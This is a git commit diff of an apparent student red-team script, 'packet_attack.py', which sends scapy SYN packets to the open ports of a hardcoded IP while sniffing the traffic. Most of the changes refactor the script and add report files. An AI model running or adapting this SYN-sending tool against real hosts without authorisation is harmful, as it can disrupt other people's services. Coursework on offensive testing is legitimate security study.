043282a0f1434fdd3ecc85017f2f7f0ba12a9955
Juan Viquez <jviquez027@gmail.com>
2025-08-21 01:58:58 -0600

    Update packet_attack.py

--- proyecto_ciberseguridad/red_team/packet_attack.py
+++ proyecto_ciberseguridad/red_team/packet_attack.py
@@ -4,10 +4,13 @@ from threading import Thread
 
 import os
 import re
+import shutil
 import time
 
 
 HOST = "74.179.81.132"
+TIMEOUT_SNIFFER = 10
+TIMEOUT_ENV_PAQ = 8
 ruta_actual = os.getcwd()
 ruta_reporte_scan = os.path.join(ruta_actual, "ultimo_reporte_scan.txt")
 
@@ -21,8 +24,8 @@ def validar_puertos_abiertos(ruta_reporte):
 
     try:
         # Lee el archivo, y extrae unicamente el numero de puerto
-        with open(ruta_reporte, "r", encoding="utf-8") as f:
-            for l in f:
+        with open(ruta_reporte, "r", encoding="utf-8") as archivo:
+            for l in archivo:
                 linea = l.strip()
                 m = re.search(r"Puerto\s+(\d+):\s+open", linea, re.IGNORECASE)
                 if m:
@@ -64,14 +67,16 @@ def sniffer_de_trafico(trafico_sniffer):
     Arg:
         trafico_sniffer: Lista donde se almacena el trafico capturado
     """
+
     filtro_bpf = f"host {HOST}"
 
     try:
+        # Funcion de sniffer en scapy
         sniff(
             filter=filtro_bpf,
             iface="wlan0",
             prn=lambda paquete: procesar_paquete(paquete, trafico_sniffer),
-            timeout=20
+            timeout=TIMEOUT_SNIFFER
         )
 
     except Exception as e:
@@ -84,13 +89,13 @@ def envio_TCP(puertos_dest):
     Arg:
         puertos_dest: Lista de puertos abiertos, obtenida del reporte de scanner.py
     Retorna:
-        Reporte de paquetes enviados 
+        reporte_env_paq: Reporte de datos de los paquetes enviados 
     """
 
     # Dict = cada puerto con una lista de trafico enviado
-    reporte_puertos = {p: [] for p in puertos_dest}
+    reporte_env_paq = {p: [] for p in puertos_dest}
     ip = IP(dst = HOST)
-    tiempo_envio = 15
+    tiempo_envio = TIMEOUT_ENV_PAQ
 
     inicio = time.time()
     cant_paquetes = 0
@@ -111,7 +116,8 @@ def envio_TCP(puertos_dest):
 
                 print(f"Enviando paquete SYN a {HOST}, {puerto}/tcp\n")
 
-                reporte_puertos[puerto].append({
+                # Guarda los datos especificos en el reporte
+                reporte_env_paq[puerto].append({
                     "numero" : cant_paquetes,
                     "tamaño" : len(packet),
                     "ip_o" : packet[IP].src,
@@ -125,7 +131,7 @@ def envio_TCP(puertos_dest):
             except Exception as e:
                 print(f"[!] Error armando el paquete para el puerto {puerto}: {e}")
 
-    return reporte_puertos
+    return reporte_env_paq
 
 
 def ejecutar_packet_attack(puertos):
@@ -147,8 +153,8 @@ def ejecutar_packet_attack(puertos):
 
         reporte_syn = envio_TCP(puertos) # Inicia el envio de trafico
 
-        hilo.join()  # espera a que el sniffer termine por timeout
-
+        hilo.join()  # Espera a que el sniffer termine por timeout
+        
         return reporte_syn, trafico_generado
     
     except Exception as e:
@@ -161,38 +167,93 @@ def obtener_fecha_hora():
     """
     return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
 
-
-def guardar_reporte(data_puertos, path_reporte_scan):
+def formatear_reportes(datos_envio, datos_sniff, timestamp):
     """
-    Guarda en un archivo .txt el resultado del envio de paquetes
+    Da formato legible al reporte generado con envio_TCP
+    Retorna:
+        txt_envio_syn:
+        txt_cap_sniff:
     """
-    #nuev = f"{nombre_base}_{timestamp}.txt"
+    txt_envio_syn = f"""
+    ====== REPORTE DE ENVIOS SYN - ({timestamp}) ======
+    Fecha/Hora: {timestamp}
+    IP de host atacado: {HOST}
+    Tiempo de envío de paquetes: {TIMEOUT_ENV_PAQ}\n\n"""
+    
+    for puerto, paquetes in datos_envio.items():
+        txt_envio_syn += (f"\n    Puerto: [ {puerto} ]\n")
+        for info in paquetes:
+            txt_envio_syn += (
+                f"    Paq # {str(info['numero']).ljust(3)}"
+                f" | Seq = {str(info['seq']).ljust(10)}"
+                f" | Flag {info['flag']}"
+                f" | {info['ip_o']} >> {info['ip_d']}"
+                f" | Puerto Salida = {info['puerto_o']}"
+                f" | Hora = {info['time']}\n"
+                )
+    
+    txt_cap_sniff = f"""
+    ====== REPORTE DE CAPTURA DE SNIFFER- ({timestamp}) ======
+    Fecha/Hora: {timestamp}
+    IP de host atacado: {HOST}
+    Tiempo de captura: {TIMEOUT_SNIFFER}\n\n"""
+    
+    for ev in datos_sniff:
+        txt_cap_sniff += f"    {ev["summary"]}\n"
 
+    return txt_envio_syn, txt_cap_sniff
+
+
+def guardar_reporte(datos_envio, datos_sniff):
+    """
+    Guarda un reporte del ataque en un archivo .txt
+    Arg:
+        datos_envio: Reporte de datos obtenidos en el envio de paquetes
+        datos_sniff: Reporte de datos obtenidos en la captura de trafico
+    """
+
+    try:
+        print("-" * 70)
+        print("\nGenerando reporte de ataque.....\n")
+        timestamp = obtener_fecha_hora()
+        
+        nombre_repo_syn = f"reporte_envio_paquetes_{timestamp}.txt"
+        nombre_repo_sniff = f"reporte_sniffer_{timestamp}.txt"
+        nombres = [nombre_repo_syn, nombre_repo_sniff]
+
+        repo_syn, repo_sniff = formatear_reportes(datos_envio, datos_sniff, timestamp)
+        repos = [repo_syn, repo_sniff]
+
+        for x in range(2):
+            with open(nombres[x], "w", encoding="utf-8") as archivo:
+                archivo.write(repos[x])
+
+        # Valida que exista o crea la ruta "Reportes_Red_Team/Reportes_Packet_Attack"
+        os.makedirs("Reportes_Red_Team/Reportes_Packet_Attack", exist_ok=True)
+
+        ruta_syn = os.path.join("Reportes_Red_Team/Reportes_Packet_Attack", nombres[0])
+        ruta_sniff = os.path.join("Reportes_Red_Team/Reportes_Packet_Attack", nombres[1])
+
+        # Copia los archivos al directorio Reportes_Packet_Attack
+        shutil.move(nombres[0], ruta_syn)
+        shutil.move(nombres[1], ruta_sniff)
+        
+        print("[+] Reporte guardado en: Reportes_Red_Team/Reportes_Packet_Attack/\n")
+    except OSError as e:
+        print(f"[!] Error guardando reporte: {e}\n")
+    print("-" * 70)
 
 
 if __name__ == "__main__":
     # 1) Se Obtiene la lista de los puertos abiertos
     puertos = validar_puertos_abiertos(ruta_reporte_scan)
     print("Puertos abiertos:", puertos)
+
     # 2) Se inicia el packet_attack
     reporte_syn, eventos_sniff = ejecutar_packet_attack(puertos)
     print(f"[+] Eventos sniff capturados: {len(eventos_sniff)}")
 
-    #text = envio_TCP(host, puertos)
-    for puerto, resp in reporte_syn.items():
-        print(f"REPORTE DE PUERTO: {puerto}")
-        for info in resp:
-            print(f"Paquete #{info['numero']}",
-                  f"| size={info['tamaño']}",
-                  f"| hora={info['time']}",
-                  f"| ip_origen={info['ip_o']}",
-                  f"| ip_destino={info['ip_d']}",
-                  f"| puerto_origen={info['puerto_o']}",
-                  f"| flag={info['flag']}",
-                  f"| seq={info['seq']}")
-        print("-" * 40)
+    # 3) Se guarda el reporte del Packet_attack
+    guardar_reporte(reporte_syn, eventos_sniff)
 
-    print("\n==== EVENTOS CAPTURADOS POR EL SNIFFER ====")
-    for ev in eventos_sniff:
-        print(ev["summary"])
-    print("-" * 40)
+
